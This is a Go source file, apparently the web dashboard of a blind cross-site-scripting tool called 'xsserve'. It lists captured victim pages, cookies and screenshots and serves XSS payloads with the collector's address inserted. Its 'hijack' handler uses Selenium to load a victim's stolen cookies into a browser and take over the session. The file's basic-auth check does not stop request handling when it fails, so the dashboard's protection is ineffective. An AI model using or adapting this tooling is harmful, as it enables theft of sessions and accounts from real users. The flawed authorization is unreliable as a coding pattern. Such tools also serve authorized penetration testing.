package server

import (
    "fmt"
    "html/template"
    "log"
    "net/http"
    "strings"
    "time"

    "xsserve/core"
    "xsserve/database"

    "github.com/tebeka/selenium"
    "go.mongodb.org/mongo-driver/bson"
    "go.mongodb.org/mongo-driver/bson/primitive"
)

var flags *core.Flags

// Exported functions
func ServeUI(currentFlags *core.Flags) (err error) {
    flags = currentFlags

    mux := http.NewServeMux()

    //redirectHandler := http.RedirectHandler("http://example.org", 307)
    //mux.Handle("/foo", rh)
    //notFoundHandler := http.NotFoundHandler()
    favicon := http.RedirectHandler("/static/resources/ui/images/favicon.ico", http.StatusTemporaryRedirect)
    index := http.HandlerFunc(indexHandle)
    report := http.HandlerFunc(reportHandle)
    triggers := http.HandlerFunc(triggersHandle)
    payloads := http.HandlerFunc(payloadsHandler)
    getScreenshot := http.HandlerFunc(getScreenshotHandler)
    hijackSession := http.HandlerFunc(hijackSessionHandle)

    deleteTrigger := http.HandlerFunc(deleteTriggerHandle)

    mux.Handle("/favicon.ico", favicon)
    mux.Handle("/dashboard", index)
    mux.Handle("/triggers", triggers)
    mux.Handle("/triggers/report", report)
    mux.Handle("/triggers/hijack", hijackSession)
    mux.Handle("/triggers/delete", deleteTrigger)
    mux.Handle("/payloads", payloads)
    mux.Handle("/get/screenshot", getScreenshot)

    //TODO: fix, The script from “http://host/static/resources/ui/js/main.js” was loaded even though its MIME type (“text/plain”) is not a valid JavaScript MIME type.
    mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.FS(StaticFS))))

    server := &http.Server{
        Addr:           fmt.Sprintf("%s:%d", flags.UIAddress, flags.UIPort),
        Handler:        mux,
        ReadTimeout:    10 * time.Second,
        WriteTimeout:   10 * time.Second,
        MaxHeaderBytes: 1 << 20,
    }
    err = server.ListenAndServe()

    return err
}

func loadTemplate(file string) (*template.Template, error) {
    tmpl, err := template.ParseFS(FS, file, "resources/ui/layout.tmpl")

    return tmpl, err
}

// Handles
func indexHandle(w http.ResponseWriter, r *http.Request) {
    /*Basic auth*/
    checkAutorization(w, r)

    tmpl, err := loadTemplate("resources/ui/index.tmpl")
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
        return
    }

    err = tmpl.Execute(w, nil)
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }
}

func triggersHandle(w http.ResponseWriter, r *http.Request) {
    /*Basic auth*/
    checkAutorization(w, r)

    tmpl, err := loadTemplate("resources/ui/triggers.tmpl")
    if err != nil {
        log.Println(err.Error())
        http.Error(w, "Internal Server Error", 500)
        return
    }

    var triggers []core.Trigger
    cursor, err := database.DB.Collection("triggers").Find(database.CTX, bson.M{})
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }
    cursor.All(database.CTX, &triggers)

    err = tmpl.Execute(w, triggers)
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }
}

func hijackSessionHandle(w http.ResponseWriter, r *http.Request) {
    /*Basic auth*/
    checkAutorization(w, r)

    // Setup node capabilities
    caps := selenium.Capabilities{"browserName": flags.SeleniumBrowser}
    wd, err := selenium.NewRemote(caps, flags.SeleniumURL)
    if err != nil {
        log.Println(err)
    }
    //defer wd.Quit()

    objID, err := primitive.ObjectIDFromHex(r.URL.Query().Get("id"))
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }

    var trigger core.Trigger
    err = database.DB.Collection("triggers").FindOne(database.CTX, bson.M{"_id": objID.Hex()}).Decode(&trigger)
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }

    // Navigate to the simple playground interface. //
    if err := wd.Get(trigger.URI); err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }

    // Set the cookies
    for _, cookie := range trigger.Cookies {
        log.Println(cookie)
        wd.AddCookie(&selenium.Cookie{
            Domain: cookie.Domain,
            Name:   cookie.Name,
            Value:  cookie.Value,
            Path:   cookie.Path,
            Expiry: uint(cookie.Expires.Unix()),
            Secure: cookie.Secure,
        })
    }
    //wd.Refresh() // Refresh the page after cookies are added?
}

func reportHandle(w http.ResponseWriter, r *http.Request) {
    /*Basic auth*/
    checkAutorization(w, r)

    tmpl, err := loadTemplate("resources/ui/report.tmpl")
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
        return
    }

    objID, err := primitive.ObjectIDFromHex(r.URL.Query().Get("id"))
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }

    var trigger core.Trigger
    err = database.DB.Collection("triggers").FindOne(database.CTX, bson.M{"_id": objID.Hex()}).Decode(&trigger)
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }

    err = tmpl.Execute(w, trigger)
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }
}

func deleteTriggerHandle(w http.ResponseWriter, r *http.Request) {
    /*Basic auth*/
    checkAutorization(w, r)

    objID, err := primitive.ObjectIDFromHex(r.URL.Query().Get("id"))
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }

    database.DB.Collection("triggers").DeleteOne(database.CTX, bson.M{"_id": objID.Hex()})

    http.Redirect(w, r, "/triggers", http.StatusSeeOther)
}

func payloadsHandler(w http.ResponseWriter, r *http.Request) {
    /*Basic auth*/
    checkAutorization(w, r)

    // TODO: add more payloads and customize payloads with current HOST/IP address
    tmpl, err := loadTemplate("resources/ui/payloads.tmpl")
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
        return
    }

    var payloads []core.Payload
    cursor, err := database.DB.Collection("payloads").Find(database.CTX, bson.M{})
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }
    cursor.All(database.CTX, &payloads)

    var protocol, endpoint, url string
    protocol = "http"
    if flags.IsHTTPS {
        protocol = "https"
    }
    endpoint = flags.XSSAddress
    if flags.Domain != "" {
        endpoint = flags.Domain
    }

    url = fmt.Sprintf("%v://%v:%v", protocol, endpoint, flags.XSSPort)
    for i, payload := range payloads {
        payloads[i].Code = strings.ReplaceAll(payload.Code, "[[HOST_REPLACE_ME]]", url)
    }

    err = tmpl.Execute(w, payloads)
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }
}

func getScreenshotHandler(w http.ResponseWriter, r *http.Request) {
    /*Basic auth*/
    checkAutorization(w, r)

    objID, err := primitive.ObjectIDFromHex(r.URL.Query().Get("id"))
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }

    var trigger core.Trigger
    err = database.DB.Collection("triggers").FindOne(database.CTX, bson.M{"_id": objID.Hex()}).Decode(&trigger)
    if err != nil {
        log.Println(err)
        http.Error(w, "Internal Server Error", 500)
    }

    w.Header().Add("Content-type", "image/png")
    w.Write(trigger.Screenshot)
}

/* Check basic authentication */
func checkAutorization(w http.ResponseWriter, r *http.Request) {
    if flags.BasicAuth {
        username, password, ok := r.BasicAuth()
        if !ok {
            w.Header().Add("WWW-Authenticate", `Basic realm="Enter the username and password"`)
            w.WriteHeader(http.StatusUnauthorized)
            w.Write([]byte(`{"message": "No basic auth present"}`))
            return
        }

        if username != flags.BasicAuthUser || password != flags.BasicAuthPass {
            w.Header().Add("WWW-Authenticate", `Basic realm="Enter the username and password"`)
            w.WriteHeader(http.StatusUnauthorized)
            w.Write([]byte(`{"message": "Invalid username or password"}`))
            return
        }
    }
}
